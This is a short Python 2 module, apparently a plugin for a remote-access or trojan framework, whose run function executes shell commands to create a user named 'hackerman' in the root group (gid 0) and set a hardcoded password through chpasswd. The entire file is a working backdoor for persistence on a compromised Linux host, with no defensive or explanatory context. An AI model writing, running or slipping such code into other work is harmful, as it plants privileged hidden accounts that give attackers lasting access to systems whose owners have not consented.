import os
import subprocess

def run(**args):
    print "[*] In adduser module."

    info = ""
    output = subprocess.check_output("useradd -g 0 -m hackerman", stderr=subprocess.STDOUT, shell=True)
    info += output + "\n"

    output = subprocess.check_output("echo -n 'hackerman:Password1!' | chpasswd", stderr=subprocess.STDOUT, shell=True)
    info += output + "\n"

    info += "user added\n"
    return info